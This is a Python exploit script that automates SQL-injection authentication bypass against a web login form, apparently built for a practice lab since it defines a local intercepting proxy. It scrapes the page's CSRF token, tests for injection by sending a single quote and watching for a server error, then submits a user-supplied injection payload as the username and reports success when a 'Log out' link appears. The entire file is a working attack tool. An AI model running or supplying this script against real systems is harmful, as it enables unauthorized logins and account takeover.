import sys
import validators
import requests
from bs4 import BeautifulSoup


class Exploit():
    def __init__(self) -> None:
        self.url = ''
        self.csrf = ''
        self.proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
        self.payload = ''
        self.is_vulnerable = False
        self.session = requests.session()
        self.check_params()
        self.set_url()
        self.set_payload()
        self.set_csrf_token()
        self.check_vulnerability()
        self.data = {'csrf': self.csrf, 'username': self.payload, 'password': 'admin'}
        self.is_sccessful = False
    
    def check_params(self) -> None:
        if len(sys.argv) < 3:
            print(f'[-] Usage: {sys.argv[0]} <URL> <pylaod>')
            print(f'[-] Example: {sys.argv[0]} http://example.com "1=1"')
            exit()
    
    def set_url(self) -> None:
        url = sys.argv[1].strip()
        is_valid = validators.url(url)
        if not is_valid:
            print(f'[-] The URL "{url}" is not valid.')
            print(f'[-] Example of a valid URL: http://example.com')
            exit()

        self.url = url
    
    def set_csrf_token(self) -> None:
        req = self.session.get(self.url)
        soup = BeautifulSoup(req.text, 'html.parser')
        self.csrf = soup.find('input')['value']
    
    def set_payload(self) -> None:
        payload = sys.argv[2].strip()
        self.payload = payload
    
    def check_vulnerability(self) -> None:
        print('[+] Checking bulnerability...')
        data = {'csrf': self.csrf, 'username': "'", 'password': 'admin'}
        req = self.session.post(self.url, data=data)
        if 'Internal Server Error' in req.text:
            print('[+] The app is vulnerable!')
            self.is_vulnerable = True
        else:
            print('[-] The app is not vulnerable!')
    
    def run(self) -> None:
        if self.is_vulnerable:
            req = self.session.post(self.url, data=self.data)
            if 'Log out' in req.text:
                self.is_sccessful = True

def main() -> None:
    exploit = Exploit()
    exploit.run()

    if exploit.is_sccessful:
        print('[+] Exploit was successful!')
    else:
        print('[-] Exploit was not successful!')

if __name__ == '__main__':
    main()
